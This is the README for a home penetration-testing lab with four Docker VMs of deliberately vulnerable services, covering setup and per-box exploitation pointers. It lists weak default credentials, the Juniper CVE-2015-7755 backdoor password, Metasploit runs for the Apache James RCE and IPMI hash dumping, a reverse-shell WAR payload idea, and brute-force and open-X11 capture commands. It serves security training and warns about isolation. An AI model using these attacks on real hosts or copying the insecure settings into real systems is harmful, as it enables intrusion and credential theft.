# Pentest Practice Lab — 4 VMs, one target box each

Four deliberately-vulnerable hosts, **one per virtual machine** (1:1). Each VM
runs the Docker stack for its box with **host networking**, so the containers
bind straight to the VM's own IP on normal ports — the VM *is* the host. Your
separate Kali box scans the VM IPs like ordinary targets.

```
   Kali (your attacker box)
        |
   ── LAN ────────────────────────────────────────────────
        |             |             |             |
     web01 VM     files01 VM     app01 VM      desk01 VM
   DVWA/FTP/SSH   NFS/SMB/       WordPress/    X11 (open)/
                  Redis/SNMP     Tomcat/MySQL  RDP (weak)
```

> ⚠️ Every image here is **intentionally insecure**. Run the VMs on an isolated
> lab network. See **Safety / isolation** at the bottom.

## Layout

Assign each VM a LAN IP (static or DHCP reservation) and note it down — those
three IPs are what you scan. The loot refers to the boxes by the hostnames
`web01` / `files01` / `app01`.

| VM          | Service        | Port      | Access / creds          | Issue to find                          |
|-------------|----------------|-----------|-------------------------|----------------------------------------|
| **web01**   | DVWA           | 80/tcp    | `admin` / `password`*   | SQLi, XSS, file upload, cmd injection  |
|             | FTP            | 21/tcp    | `ftp` / `ftp`, writable | weak creds / writable FTP root         |
|             | SSH            | 22/tcp    | `root` / `root`         | weak SSH creds                         |
|             | Werkzeug       | 5000/tcp  | PIN `1234`              | Flask debug console → RCE              |
| **files01** | NFS export     | 2049/tcp  | `/data`, `rw,*`         | **open NFS share** (no_root_squash)    |
|             | Samba `public` | 445,139   | guest, writable         | anonymous SMB share                    |
|             | Redis          | 6379/tcp  | no auth                 | unauthenticated Redis (→ RCE/key write)|
|             | SNMP (v2c)     | 161/udp   | community `public`/`private` | default SNMP community strings    |
|             | Juniper SSG5   | 23/tcp    | `netscreen`/`netscreen` or CVE-2015-7755 | weak telnet creds + hardcoded backdoor |
|             | LDAP           | 389/tcp   | `admin`/`ldapadmin`, anon bind  | anonymous enumeration + cleartext creds in description |
|             | SMTP (James)   | 25/tcp    | `root`/`root` (admin)   | **CVE-2015-7611** path traversal → cron RCE |
|             | POP3 (James)   | 110/tcp   | LDAP user list          | weak creds, brute-forceable            |
|             | IMAP (James)   | 143/tcp   | LDAP user list          | weak creds, brute-forceable            |
|             | James admin    | 4555/tcp  | `root`/`root`           | default admin creds → user mgmt        |
|             | IPMI 2.0 (BMC) | 623/udp   | `admin`/`admin`, `ADMIN`/`ADMIN`, `root`/`root` | **CVE-2013-4786** RAKP hash retrieval + **CVE-2013-4782** cipher zero |
| **app01**   | WordPress 4.6  | 80/tcp    | set during install      | outdated WP core/plugins (CVEs)        |
|             | Tomcat Manager | 8080/tcp  | `tomcat` / `tomcat`     | default manager creds → WAR-to-shell   |
|             | MySQL          | 3306/tcp  | `root` / `root`         | weak DB root creds                     |
|             | Brocade FWS624 | 23/tcp    | `username`/`password`   | weak telnet creds, config disclosure   |
| **desk01**  | X11            | 6000/tcp  | none (access control off)| open X display → screenshot/keylog    |
|             | RDP (xrdp)     | 3389/tcp  | `ubuntu` / `ubuntu`     | weak RDP creds                         |
|             | VNC (x11vnc)   | 5900/tcp  | `password`              | weak VNC password                      |

\* DVWA: browse to `http://<web01-ip>/setup.php` once, click **Create / Reset
Database**, then log in with `admin` / `password`.

### Extra valid credentials (the loot actually works)

The defaults above always work. On top of them, the files on the files01 NFS
share map to **real, additional accounts** on the live services, so cracking a
hash or reading a config genuinely gets you in. Creds are reused across boxes
on purpose (as real users do), so a found password is worth trying elsewhere.

| Credential          | Works on                          | Where it's leaked on the share                         |
|---------------------|-----------------------------------|--------------------------------------------------------|
| `jsmith` / `password123` | SSH (web01), FTP (web01), WordPress | `backups/web01-shadow.bak` (sha512crypt), `backups/wp_users_dump.sql` (md5), `it/passwords_export.csv` |
| `agarcia` / `123456`     | SSH (web01), WordPress             | `backups/wp_users_dump.sql` (md5)                      |
| `backup` / `letmein`     | SSH (web01), FTP (web01), WordPress | `backups/wp_users_dump.sql` (md5)                      |
| `admin` / `admin123`     | Tomcat Manager (app01)             | `web/.htpasswd` (apr1), `it/passwords_export.csv`; also shown on the desk01 X11 screen |
| `jsmith` / `password123` (again) | RDP (desk01)               | same `jsmith` password reused on the workstation       |
| `ubuntu` / `ubuntu`      | RDP (desk01)                       | weak built-in workstation account                      |
| `root` / `root`          | SSH (web01) — the default          | `backups/web01-shadow.bak` cracks to this too          |
| `trogdon` / `ttrogdon`       | Brocade (app01), LDAP bind (files01)  | LDAP `uid=trogdon` (anon-visible uid); Brocade `show config` output |
| `dmudd` / `crazypassword`    | Brocade (app01), LDAP bind (files01)  | LDAP `uid=dmudd`; Brocade `show config` output          |
| `svc-backup` / `Backup2024!` | LDAP bind (files01)                   | LDAP `uid=svc-backup` `description` field (anonymous-readable) |

WordPress accounts only go live after you seed them (see the app01 deploy step).

## Repository layout

```
web01/     -> deploy on the web01 VM   (docker-compose.yml + ssh-setup.sh + ftp/)
files01/   -> deploy on the files01 VM (docker-compose.yml + snmp + nfs/ + smb/)
app01/     -> deploy on the app01 VM   (docker-compose.yml + tomcat-setup.sh + wp_seed_users.sql)
desk01/    -> deploy on the desk01 VM  (docker-compose.yml + x11/ + rdp/ Dockerfiles)
docker_start_instance.sh  -> helper: ./docker_start_instance.sh <box> [action]
```

Copy each folder to its matching VM (or clone the whole repo on each and `cd`
into the right folder).

## Prerequisites (per VM)

- A Linux VM with Docker Engine + the Compose plugin (install steps below).
- **web01:** the vulnerable SSH wants port **22**. Move the VM's own sshd to
  another port (`Port 2222` in `/etc/ssh/sshd_config`, then `systemctl restart
  ssh`) or run the VM from the hypervisor console, so the container can own 22.
- **files01:** load the kernel NFS modules (the NFS container uses the kernel
  server) and do **not** run the VM's own `nfs-kernel-server`:
  ```bash
  sudo modprobe nfs nfsd
  echo -e "nfs\nnfsd" | sudo tee /etc/modules-load.d/nfs.conf   # persist on reboot
  ```
  The James mail container downloads the Apache James 2.3.2 binary at build time
  so this VM also needs internet on first `up --build`. Stop any local MTA before
  bringing James up so port 25 is free:
  ```bash
  sudo systemctl stop postfix exim4 2>/dev/null || true
  sudo systemctl disable postfix exim4 2>/dev/null || true
  ```
- All three VMs should sit on the **same LAN segment** as your Kali box.
- **desk01:** its images build from local Dockerfiles, so that VM needs internet
  on first `up --build`. Run it on a **headless** VM (no local desktop) so the
  VM's own X server / RDP isn't already using `:0` (6000) or 3389.

## Installing Docker on Ubuntu (run on each VM)

Sets up Docker Engine + the Compose plugin from Docker's official apt repo
(works on Ubuntu 20.04 / 22.04 / 24.04).

```bash
# 1. remove any old/distro Docker packages that would conflict
sudo apt-get remove -y docker docker-engine docker.io containerd runc 2>/dev/null || true

# 2. prerequisites + Docker's GPG key
sudo apt-get update
sudo apt-get install -y ca-certificates curl gnupg
sudo install -m 0755 -d /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/ubuntu/gpg \
  | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
sudo chmod a+r /etc/apt/keyrings/docker.gpg

# 3. add the Docker apt repo for your Ubuntu release
echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] \
https://download.docker.com/linux/ubuntu $(. /etc/os-release && echo "$VERSION_CODENAME") stable" \
  | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null

# 4. install engine + CLI + compose plugin
sudo apt-get update
sudo apt-get install -y docker-ce docker-ce-cli containerd.io \
  docker-buildx-plugin docker-compose-plugin

# 5. run docker without sudo (log out/in afterwards, or run `newgrp docker`)
sudo usermod -aG docker "$USER"
newgrp docker

# 6. verify
docker run --rm hello-world
docker compose version
```

If Docker isn't running: `sudo systemctl enable --now docker`.

## Deploy

Each box has a helper script at the lab root — copy `docker_start_instance.sh`
to each VM (or clone the whole repo) and run it with the box name:

```bash
./docker_start_instance.sh web01        # up (default)
./docker_start_instance.sh files01      # loads NFS modules, then up
./docker_start_instance.sh app01        # up; then run the WP seed it prints
./docker_start_instance.sh desk01       # builds the X11/RDP images, then up
# other actions: down | restart | logs | status
./docker_start_instance.sh app01 logs
```

It auto-detects `docker compose`, runs the right per-box pre-flight (NFS modules
for files01, `--build` for desk01, port-22 / FTP-address warnings for web01) and
prints the next step. The manual equivalents are below.

**web01 VM** (after freeing port 22):
```bash
cd web01
# edit docker-compose.yml: set ftp ADDRESS to THIS VM's LAN IP (passive FTP)
docker compose up -d
# DVWA: open http://<web01-ip>/setup.php and click Create/Reset Database
```

**files01 VM** (after `modprobe nfs nfsd` and stopping any local MTA):
```bash
cd files01
docker compose up -d --build   # builds James (needs internet on first run)
```

**app01 VM:**
```bash
cd app01
docker compose up -d          # give MySQL ~a minute to go healthy first
# finish the WordPress wizard at http://<app01-ip>/ , then seed extra logins:
docker exec -i mysql mysql -uroot -proot wordpress < wp_seed_users.sql
```

**desk01 VM:**
```bash
cd desk01
docker compose up -d --build  # builds the X11 + xrdp images (needs internet)
```

## Sizing (per VM)

These are mostly idle; load comes from MySQL init / Tomcat's JVM on first boot.
Assumes a minimal Ubuntu Server guest.

| VM      | vCPU | RAM    | Disk  | Why                                            |
|---------|------|--------|-------|------------------------------------------------|
| web01   | 1    | 1 GB   | 8 GB  | Apache/PHP/MySQL (DVWA) + FTP + SSH, all light.|
| files01 | 1    | 1 GB   | 4 GB  | NFS + Samba + Redis + SNMP are tiny.           |
| app01   | 2    | 2 GB   | 12 GB | MySQL + Tomcat JVM + WordPress together.       |
| desk01  | 2    | 2 GB   | 14 GB | xfce desktop + X server; image build is chunky.|

Each VM pulls ~1–1.5 GB of images. Take a clean snapshot once a box is built so
you can roll back after you've trashed it.

## Scan it (from your Kali box)

Point Kali at the three VM IPs (substitute your actual addresses):

```bash
nmap -sn 192.168.1.0/24                              # find the VMs
nmap -sV -p- <web01-ip> <files01-ip> <app01-ip> <desk01-ip>   # full TCP + versions
nmap -sU -p161 <files01-ip>                          # SNMP is UDP
```

## Quick exploitation pointers (per box)

**web01**
- `http://<web01-ip>/` → DVWA. Set security to *low* first, work up.
- `ftp <web01-ip>` → `ftp`/`ftp` (writable root), or the looted
  `jsmith`/`password123` and `backup`/`letmein`.
- `ssh root@<web01-ip>` → `root`/`root`, or the looted `jsmith`, `agarcia`,
  `backup` accounts (see the credentials table).
- Werkzeug debug console (port 5000):
  ```bash
  curl http://<web01-ip>:5000/crash   # triggers the interactive debugger page
  # Navigate to http://<web01-ip>:5000/crash in a browser
  # Enter PIN: 1234  → Python console → RCE
  # msf: use exploit/multi/http/werkzeug_debug_rce
  ```
  The PIN is intentionally weak (`1234`). In a real engagement you'd compute it
  from `/proc/net/arp`, `/etc/machine-id`, and the app's `/proc/self/cgroup`.

**files01**
- Juniper SSG5 (port 23):
  ```bash
  telnet <files01-ip>
  # login: netscreen  password: netscreen
  # or CVE-2015-7755 backdoor: any username + password: <<< %s(un='%s') = %u
  # commands: get system, get config, ?
  # msf: use auxiliary/scanner/telnet/juniper_backdoor (CVE-2015-7755)
  #      use auxiliary/scanner/telnet/juniper_config
  ```
- NFS: `showmount -e <files01-ip>`, then
  `mkdir /mnt/nfs && mount -t nfs <files01-ip>:/data /mnt/nfs` and dig through it.
  `no_root_squash` lets you write files owned by root. The share is stocked like
  a real file server — under `shares/` are app configs with embedded DB creds
  (`web/wp-config.php`, `web/.env`), an `it/passwords_export.csv` and
  `it/network_inventory.txt` mapping the other boxes, `backups/wp_users_dump.sql`
  (MD5) and `backups/web01-shadow.bak` (sha512crypt) to crack, and `home/jsmith/`
  with a `.bash_history` that leaks creds.
- Crack the dumped hashes: `hashcat -m 0 ... rockyou.txt` (the MD5s),
  `hashcat -m 1800 ... rockyou.txt` (the sha512crypt lines). Common rockyou words.
- SMB: `smbclient -N -L //<files01-ip>`, then `smbclient -N //<files01-ip>/public`
  (add `-m SMB2` if your client refuses guest).
- Redis: `redis-cli -h <files01-ip> INFO` — no auth. Look up the unauth-Redis
  RCE / SSH-key-write technique.
- SNMP (v2c, UDP):
  ```bash
  snmpwalk -v2c -c public <files01-ip>                    # full tree
  snmpwalk -v2c -c public <files01-ip> hrSWRunName        # running processes
  snmpwalk -v2c -c public <files01-ip> nsExtendOutputFull # planted secret
  ```
  `public` is read-only, `private` is read-write. On Kali you may need
  `apt-get install -y snmp snmp-mibs-downloader`. The extend output leaks a
  backup-job credential that works on web01.

- LDAP (port 389):
  ```bash
  # anonymous bind — enumerate users, groups, and service-account descriptions
  ldapsearch -x -H ldap://<files01-ip> -b "dc=corp,dc=local" \
    "(objectClass=inetOrgPerson)" uid cn mail description
  ldapsearch -x -H ldap://<files01-ip> -b "ou=ServiceAccounts,dc=corp,dc=local"
  # svc-backup description leaks "passwd: Backup2024!" in plaintext

  # bind as admin — dumps cleartext userPassword for every account
  ldapsearch -x -H ldap://<files01-ip> -b "dc=corp,dc=local" \
    -D "cn=admin,dc=corp,dc=local" -w ldapadmin userPassword

  # nmap
  nmap -p389 --script ldap-search,ldap-rootdse <files01-ip>

  # msf:
  # use auxiliary/scanner/ldap/ldap_login    (spray the found usernames)
  # use auxiliary/gather/ldap_query          (full tree dump)
  ```
  User bind DNs follow `uid=<username>,ou=Users,dc=corp,dc=local`. The `trogdon`
  and `dmudd` accounts discovered here are reused on app01's Brocade switch
  (credential reuse chain).

- SMTP/POP3/IMAP — Apache James 2.3.2 (CVE-2015-7611, ports 25/110/143/4555):
  ```bash
  # version/banner grab
  nmap -sV -p25,110,143,4555 <files01-ip>
  use auxiliary/scanner/smtp/smtp_version

  # admin console — default root/root
  telnet <files01-ip> 4555
  # login root root
  # listusers
  # adddomain / adduser / setpassword / quit

  # CVE-2015-7611 — path traversal file write → cron.d → RCE within 60s
  use exploit/linux/smtp/apache_james_exec
  set RHOSTS <files01-ip>
  set LHOST <kali-ip>
  set SRVHOST <kali-ip>
  # default target is Cron; payload runs within 60 seconds via cron
  run

  # SMTP user enumeration (VRFY/EXPN)
  use auxiliary/scanner/smtp/smtp_enum
  set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
  # jsmith, agarcia, backup, trogdon, dmudd are valid

  # POP3 brute force with the found usernames
  use auxiliary/scanner/pop3/pop3_login
  set RHOSTS <files01-ip>
  set USER_FILE /tmp/users.txt   # jsmith agarcia backup trogdon dmudd
  set PASS_FILE /usr/share/wordlists/rockyou.txt

  # Manual POP3 (read mail after exploitation)
  telnet <files01-ip> 110
  # USER jsmith
  # PASS password123
  # STAT / LIST / RETR 1 / QUIT
  ```
  Mail accounts share the same credentials as the LDAP users. The admin
  portal (4555) accepts `root`/`root` by default — list/add/delete users
  without any exploit needed.

- IPMI 2.0 BMC (UDP 623 — CVE-2013-4786 / CVE-2013-4782):
  ```bash
  # Detect IPMI and version
  nmap -sU -p623 <files01-ip>
  use auxiliary/scanner/ipmi/ipmi_version

  # CVE-2013-4786 — unauthenticated RAKP hash retrieval (hashcat -m 7300)
  use auxiliary/scanner/ipmi/ipmi_dumphashes
  set RHOSTS <files01-ip>
  set OUTPUT_HASHCAT_FILE /tmp/ipmi_hashes.txt
  run
  # crack offline:
  hashcat -m 7300 /tmp/ipmi_hashes.txt /usr/share/wordlists/rockyou.txt

  # CVE-2013-4782 — cipher suite 0 auth bypass (authenticate with any password)
  use auxiliary/scanner/ipmi/ipmi_cipher_zero
  set RHOSTS <files01-ip>
  run
  ```
  Valid usernames to probe: `admin`, `Admin`, `ADMIN`, `root`, `jsmith`.
  Cracked hashes reuse passwords already on other services (credential reuse chain).

**app01**
- Brocade FWS624 / ICX6450 (port 23):
  ```bash
  telnet <app01-ip>
  # username/password, ttrogdon/ttrogdon, or dmudd/crazypassword
  # enable → prompts for username+password again
  # show config / show running-config → credential disclosure
  # show version → firmware version
  # switchversion → toggle 7.2 ↔ 7.4 response
  # msf: use auxiliary/scanner/telnet/brocade_enable_login
  #      use auxiliary/scanner/telnet/brocade_config
  ```
- `http://<app01-ip>/` → finish the WordPress wizard (WP 4.6 has core CVEs; see
  the plugin note below). Then run the seed command from Deploy so
  `jsmith`/`password123`, `agarcia`/`123456`, `backup`/`letmein` log into wp-admin.
- `http://<app01-ip>:8080/manager/html` → `tomcat`/`tomcat` **or**
  `admin`/`admin123` (the cracked `.htpasswd`). Deploy a JSP/WAR payload (e.g.
  from `msfvenom -p java/jsp_shell_reverse_tcp`).
- `mysql -h <app01-ip> -uroot -proot`.

**desk01**
- X11 (open display, no auth — `nmap -p6000` shows it):
  ```bash
  xwininfo -root -tree -display <desk01-ip>:0          # enumerate windows
  xwd -root -display <desk01-ip>:0 -out screen.xwd && convert screen.xwd screen.png
  ```
  The screenshot shows a "sticky note" that leaks `admin`/`admin123` for app01's
  Tomcat. Keystroke logging against an open display (e.g. `xspy`-style tools) is
  the other classic abuse. On Kali: `apt-get install -y x11-apps x11-utils
  imagemagick`.
- RDP: `nmap -p3389 --script rdp-ntlm-info <desk01-ip>`, then connect with
  `xfreerdp /v:<desk01-ip> /u:ubuntu /p:ubuntu` (or the reused
  `jsmith`/`password123`). `hydra -t 4 -l ubuntu -P rockyou.txt rdp://<desk01-ip>`
  is the spray-the-creds exercise.
- VNC (password auth, port 5900):
  ```bash
  nmap -sV -p5900 <desk01-ip>                          # detect VNC
  vncviewer <desk01-ip>:5900                            # password: password
  # or with metasploit:
  # use auxiliary/scanner/vnc/vnc_login
  # use auxiliary/scanner/vnc/vnc_none_auth
  ```
  The VNC desktop shows a sticky note leaking the `backup`/`letmein` credential
  (also valid on web01 SSH and FTP — credential reuse chain).

### Add a vulnerable WordPress plugin (optional, makes app01 meatier)
After the wizard, drop an old plugin with a known CVE into the running container:
```bash
docker exec -it wordpress bash -c \
  'cd /var/www/html/wp-content/plugins && \
   curl -sLO https://downloads.wordpress.org/plugin/<plugin>.<vuln-version>.zip && \
   apt-get update && apt-get install -y unzip && unzip -o <plugin>.<vuln-version>.zip'
```
Activate it in `wp-admin`. Pick a plugin/version from a CVE database. (Downloads
need outbound internet on that VM.)

## Teardown
On each VM, from its folder:
```bash
docker compose down -v
```

## Safety / isolation (read this)
These are **knowingly broken** systems — unauth Redis, root/root SSH, world-
readable NFS, default Tomcat creds. On a LAN they're reachable by everything on
that segment, not just Kali.

- Run the three VMs on an **isolated lab network/VLAN** with no route to your
  real network or the internet. Not your everyday home/office LAN.
- Don't expose them to the internet or a public cloud with open security groups.
- Only attack hosts you own. This lab exists so all your targets are yours.
- Snapshot each VM when built; tear down (`docker compose down -v`) when done.
- All "loot" files here are fake placeholders for practice.
